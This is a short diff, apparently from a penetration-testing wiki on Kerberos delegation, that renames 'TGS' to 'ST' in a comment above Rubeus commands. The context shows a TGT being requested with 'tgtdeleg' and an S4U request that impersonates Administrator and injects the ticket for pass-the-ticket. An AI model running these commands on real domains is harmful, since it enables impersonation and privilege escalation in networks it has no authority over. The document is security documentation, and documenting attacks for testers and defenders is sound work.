@@ -110,7 +110,7 @@ In [some cases](delegations.md#theory), the delegation will not work. Depending 
 # Request the TGT
 Rubeus.exe tgtdeleg
 
-# Request the TGS and inject it for pass-the-ticket
+# Request the ST and inject it for pass-the-ticket
 Rubeus.exe s4u /ticket:$base64_extracted_TGT /impersonateuser:Administrator /domain:$DOMAIN /msdsspn:$Target_SPN /dc:$DomainController /ptt
 ```
 
